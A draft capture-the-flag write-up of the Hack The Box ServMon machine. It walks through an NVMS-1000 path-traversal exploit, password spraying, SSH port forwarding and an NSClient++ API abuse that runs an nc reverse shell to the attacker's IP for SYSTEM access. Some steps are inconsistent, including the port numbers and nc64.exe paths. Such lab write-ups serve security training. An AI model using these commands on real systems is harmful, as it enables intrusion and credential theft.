---
layout: post
title:  HTB ServMon Write-up (Being edited now)
description: Part of the OSCP+ Preparation Series
date:   2024-11-09 20:00:00 +0300
image:  '/images/htb_servmon.png'
tags:   [Write-ups, HTB, OSCP+, Windows, Easy, FTP, CVE, Path-Traversal, Password-Spraying, SSH, Port-Forwarding, .bat]
---

# Table of Contents
- [Enumeration](#enumeration)
  - [Nmap](#nmap)
  - [FTP Anonymous access](#ftp-anonymous-access)
  - [Web Enumeration](#web-enumeration)
  - [### CVE 2019-20085 NVMS 1000 Path Traversal](#cve-2019-20085-nvms-1000-directory-traversal)
- [Foothold](#foothold)
  - [Password Spraying with NetExec](#password-spraying-with-netexec)
  - [SSH access as user nadine](#ssh-access-as-user-nadine)
- [Privilege Escalation](#privilege-escalation)
  - [Getting NSClient++ Password and SSH Port 8443 Forward to get access into NSClient+](#getting-nsclient-password-and-ssh-port-8443-forward-to-get-access-into-nsclient)
  - [Escalate Privileges with .bat file and nc64.exe creating a scheduled script](#escalate-privileges-with-bat-file-and-nc64exe-creating-a-scheduled-script)

# Enumeration
### Nmap
```shell
# Step 1 - Find active ports
nmap -p- --min-rate 10000 10.129.141.209

# Step 2 - Focus scan on the active ports found (Note: In this case is important to use -T4 to make the scan succeed)
nmap -A -T4 -Pn -p21,22,80,135,139,445,5666,6063,6699,8443 10.129.141.209
```

```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-09 04:49 EST
Nmap scan report for 10.129.141.209
Host is up (0.033s latency).

PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_02-28-22  06:35PM       <DIR>          Users
22/tcp   open  ssh           OpenSSH for_Windows_8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 c7:1a:f6:81:ca:17:78:d0:27:db:cd:46:2a:09:2b:54 (RSA)
|   256 3e:63:ef:3b:6e:3e:4a:90:f3:4c:02:e9:40:67:2e:42 (ECDSA)
|_  256 5a:48:c8:cd:39:78:21:29:ef:fb:ae:82:1d:03:ad:af (ED25519)
80/tcp   open  http
|_http-title: Site doesn't have a title (text/html).
| fingerprint-strings: 
|   GetRequest, HTTPOptions, RTSPRequest: 
|     HTTP/1.1 200 OK
|     Content-type: text/html
|     Content-Length: 340
|     Connection: close
|     AuthInfo: 
|     <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
|     <html xmlns="http://www.w3.org/1999/xhtml">
|     <head>
|     <title></title>
|     <script type="text/javascript">
|     window.location.href = "Pages/login.htm";
|     </script>
|     </head>
|     <body>
|     </body>
|     </html>
|   NULL: 
|     HTTP/1.1 408 Request Timeout
|     Content-type: text/html
|     Content-Length: 0
|     Connection: close
|_    AuthInfo:
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
5666/tcp open  tcpwrapped
6063/tcp open  x11?
6699/tcp open  napster?
8443/tcp open  ssl/https-alt
|_ssl-date: TLS randomness does not represent time
| http-title: NSClient++
|_Requested resource was /index.html
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2020-01-14T13:24:20
|_Not valid after:  2021-01-13T13:24:20
| fingerprint-strings: 
|   FourOhFourRequest, HTTPOptions, RTSPRequest, SIPOptions: 
|     HTTP/1.1 404
|     Content-Length: 18
|     Document not found
|   GetRequest: 
|     HTTP/1.1 302
|     Content-Length: 0
|     Location: /index.html
|     workers
|_    jobs
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port80-TCP:V=7.94SVN%I=7%D=11/9%Time=672F3029%P=x86_64-pc-linux-gnu%r(N
SF:ULL,6B,"HTTP/1\.1\x20408\x20Request\x20Timeout\r\nContent-type:\x20text
SF:/html\r\nContent-Length:\x200\r\nConnection:\x20close\r\nAuthInfo:\x20\
SF:r\n\r\n")%r(GetRequest,1B4,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20
SF:text/html\r\nContent-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo
SF::\x20\r\n\r\n\xef\xbb\xbf<!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x
SF:20XHTML\x201\.0\x20Transitional//EN\"\x20\"http://www\.w3\.org/TR/xhtml
SF:1/DTD/xhtml1-transitional\.dtd\">\r\n\r\n<html\x20xmlns=\"http://www\.w
SF:3\.org/1999/xhtml\">\r\n<head>\r\n\x20\x20\x20\x20<title></title>\r\n\x
SF:20\x20\x20\x20<script\x20type=\"text/javascript\">\r\n\x20\x20\x20\x20\
SF:x20\x20\x20\x20window\.location\.href\x20=\x20\"Pages/login\.htm\";\r\n
SF:\x20\x20\x20\x20</script>\r\n</head>\r\n<body>\r\n</body>\r\n</html>\r\
SF:n")%r(HTTPOptions,1B4,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/
SF:html\r\nContent-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x20
SF:\r\n\r\n\xef\xbb\xbf<!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XHT
SF:ML\x201\.0\x20Transitional//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/DTD
SF:/xhtml1-transitional\.dtd\">\r\n\r\n<html\x20xmlns=\"http://www\.w3\.or
SF:g/1999/xhtml\">\r\n<head>\r\n\x20\x20\x20\x20<title></title>\r\n\x20\x2
SF:0\x20\x20<script\x20type=\"text/javascript\">\r\n\x20\x20\x20\x20\x20\x
SF:20\x20\x20window\.location\.href\x20=\x20\"Pages/login\.htm\";\r\n\x20\
SF:x20\x20\x20</script>\r\n</head>\r\n<body>\r\n</body>\r\n</html>\r\n")%r
SF:(RTSPRequest,1B4,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/html\
SF:r\nContent-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n\
SF:r\n\xef\xbb\xbf<!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XHTML\x2
SF:01\.0\x20Transitional//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/DTD/xhtm
SF:l1-transitional\.dtd\">\r\n\r\n<html\x20xmlns=\"http://www\.w3\.org/199
SF:9/xhtml\">\r\n<head>\r\n\x20\x20\x20\x20<title></title>\r\n\x20\x20\x20
SF:\x20<script\x20type=\"text/javascript\">\r\n\x20\x20\x20\x20\x20\x20\x2
SF:0\x20window\.location\.href\x20=\x20\"Pages/login\.htm\";\r\n\x20\x20\x
SF:20\x20</script>\r\n</head>\r\n<body>\r\n</body>\r\n</html>\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port8443-TCP:V=7.94SVN%T=SSL%I=7%D=11/9%Time=672F3031%P=x86_64-pc-linux
SF:-gnu%r(GetRequest,74,"HTTP/1\.1\x20302\r\nContent-Length:\x200\r\nLocat
SF:ion:\x20/index\.html\r\n\r\n\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\
SF:0\0\0\0\0\0\0\0\x12\x02\x18\0\x1aC\n\x07workers\x12\n\n\x04jobs\x12\x02
SF:\x18X\x12\x0f")%r(HTTPOptions,36,"HTTP/1\.1\x20404\r\nContent-Length:\x
SF:2018\r\n\r\nDocument\x20not\x20found")%r(FourOhFourRequest,36,"HTTP/1\.
SF:1\x20404\r\nContent-Length:\x2018\r\n\r\nDocument\x20not\x20found")%r(R
SF:TSPRequest,36,"HTTP/1\.1\x20404\r\nContent-Length:\x2018\r\n\r\nDocumen
SF:t\x20not\x20found")%r(SIPOptions,36,"HTTP/1\.1\x20404\r\nContent-Length
SF::\x2018\r\n\r\nDocument\x20not\x20found");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-11-09T09:51:37
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 145.31 seconds
```
We found FTP port 21 and some typical Windows ports like 135, 139, 445 related to RPC and SMB and other unusual ports. There is also SSH at port 21 and a website HTTP at port 80 and HTTPS at port 8443.

We will start enumerating the FTP port 21.
### FTP Anonymous access
We were successful trying FTP Anonymous access:

```shell
ftp 10.129.141.209
```
Once we got access, we can see that there is a folder called Users and inside are two users, Nadine and Nathan. Inside the Nadine folder there is fiel called Confidential.txt, let's get it:

```shell
cd Users
cd Nadine
get Confidential.txt
```
The file contains the following message:

```shell
cat Confidential.txt

Nathan,

I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back into the secure folder.

Regards

Nadine
```
It seems like Nadine left an interesting file called Passwords.txt on Nathan's desktop.

If we check the folder of Nathan, we will also find an interesting file called Notes to do.txt. Let's get that file:

```shell
cd Users
cd Nathan
get Notes\ to\ do.txt
```
Now we can inspect the content of the file:

```shell
cat Notes\ to\ do.txt

1) Change the password for NVMS - Complete
2) Lock down the NSClient Access - Complete
3) Upload the passwords
4) Remove public access to NVMS
5) Place the secret files in SharePoint
```
It seems like a To Do list from Nathan.
### Web Enumeration
Let's take a look at the website at port 80:

```shell
https://10.129.141.209:8443
```
When visiting the URL above, we get redirected to:

```shell
http://10.129.141.209/Pages/login.htm
```
It seems to be a login portal for NVMS-1000.

### CVE 2019-20085 NVMS 1000 Directory Traversal
Searching on Google for "NVMS 1000 exploit", we found the following exploit:

https://github.com/AleDiBen/NVMS1000-Exploit.git

Let's download it and see how it works:

```shell
# Download the exploit
git clone https://github.com/AleDiBen/NVMS1000-Exploit.git
cd NVMS1000-Exploit

# Check usage
python3 nvms.py -h

****************************************************************
**                      ~CVE 2019-20085~                      **
****************************************************************

USAGE  :
        ./nvms.py <TARGET_IP> <TARGET_FILE> [OUT_FILE]
EXAMPLE:
        python nvms.py 195.135.100.10 Windows/system.ini win.ini
```
Taking a look at the example, we can change the command to read the content of passwords.txt at the desktop of Nathan:

```shell
python3 nvms.py 10.129.141.209 Users/Nathan/Desktop/passwords.txt passwords.txt
```
The exploit worked!

```shell
[+] DT Attack Succeeded
[+] Saving File Content
[+] Saved
[+] File Content

++++++++++ BEGIN ++++++++++
1nsp3ctTh3Way2Mars!                                                                                                 
Th3r34r3To0M4nyTrait0r5!                                                                                            
B3WithM30r4ga1n5tMe                                                                                                 
L1k3B1gBut7s@W0rk                                                                                                   
0nly7h3y0unGWi11F0l10w                                                                                              
IfH3s4b0Utg0t0H1sH0me                                                                                               
Gr4etN3w5w17hMySk1Pa5$                                                                                              
++++++++++  END  ++++++++++
```
Now we got some passwords to try a password spraying attack.
# Foothold
### Password Spraying with NetExec
We will use the passwords.txt file to carry out a password spraying attack with NetExec:

```shell
nxc smb 10.129.141.209 -u Administrator Nathan Nadine -p passwords.txt
```
The command above gave us a valid combination:

```shell
ServMon\Nadine:L1k3B1gBut7s@W0rk
```
### SSH access as user nadine
Now we can try and use the credentials we got to get access through SSH as the user nadine:

```shell
ssh nadine@10.129.141.209
# Password: L1k3B1gBut7s@W0rk
```
Nice! The credentials were valid.
### User Flag
Now we can get the user.txt flag:

```shell
type C:\Users\Nadine\Desktop\user.txt
```
# Privilege Escalation
### Getting NSClient++ Password and SSH Port 8443 Forward to get access into NSClient++
From our previous enumeration, we know that NSClient++ is running at port 8443.

Enumerating the folders, we found the location of NSClient++. We can now get the password running the following command inside the NSClient++ folder:

```shell
nadine@SERVMON C:\Program Files\NSClient++>nscp web -- password --display
Current password: ew2x6SsGTxjRwXOT
```
However, if we go straight to the following URL:

```shell
https://10.129.141.209:8443
```
And try to use the credentials... we will get an error 403 Your not allowed.

Examining the file nsclient.ini at the NSClient++ folder we can see that only localhosts are allowed:

```shell
; Undocumented key
allowed hosts = 127.0.0.1
```
We can use the following command to do a port forward and allow us to access the NSClient++ login portal:

```shell
ssh nadine@10.129.141.209 -L 8443:127.0.0.1:8443
# Password: L1k3B1gBut7s@W0rk
```
Once connected, we can access the login portal at the following URL:

```shell
https://127.0.0.1:8443
```
Now enter the password we found there and we will able to log in successfully:

```shell
# Enter this password
ew2x6SsGTxjRwXOT
```
### Escalate Privileges with .bat file and nc64.exe creating a scheduled script
Searching for information about how to exploit our access on NSClient++, I found we can create a .bat file to help us escalate priviliges. We will create a file called pwn.bat and put the following content inside:

```shell
cat pwn.bat

@echo off
C:\Users\Nadine\nc64.exe 10.10.14.206 9001 -e cmd
```
Move the pwn.bat and nc64.exe files:

```shell
# Start authenticated SMB server on Kali
impacket-smbserver -smb2support kalishare . -username panda -password bamboo123

# On the target CLI, connect to our SMB share
net use m: \\10.10.14.206\kalishare /user:panda bamboo123

# Copy the files
copy \\10.10.14.206\kalishare\pwn.bat .
copy \\10.10.14.206\kalishare\nc64.exe .

```
Start nc listener on Kali:

```shell
nc -lvnp 9001
```

Now we will create a script and schedule it through the API.

Run the commands below to get a shell as system:

```shell
curl -s -k -u admin -X PUT https://127.0.0.1:8443/api/v1/scripts/ext/scripts/pwn.dat --data-binary "C:\Windows\Temp\nc64.exe 10.10.14.206 9001 -e cmd.exe"

curl -s -k -u admin https://127.0.0.1:8443/api/v1/queries/evil/commands/execute?time=1m
```

After entering the commands above, we will get a response on our nc listener:

```shell
listening on [any] 9001 ...
connect to [10.10.14.206] from (UNKNOWN) [10.129.141.209] 50928
Microsoft Windows [Version 10.0.17763.864]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Program Files\NSClient++>whoami
whoami
nt authority\system
```

### Root Flag
Now we can get the root.txt flag:
```shell
type C:\Users\Administrator\Desktop\root.txt
```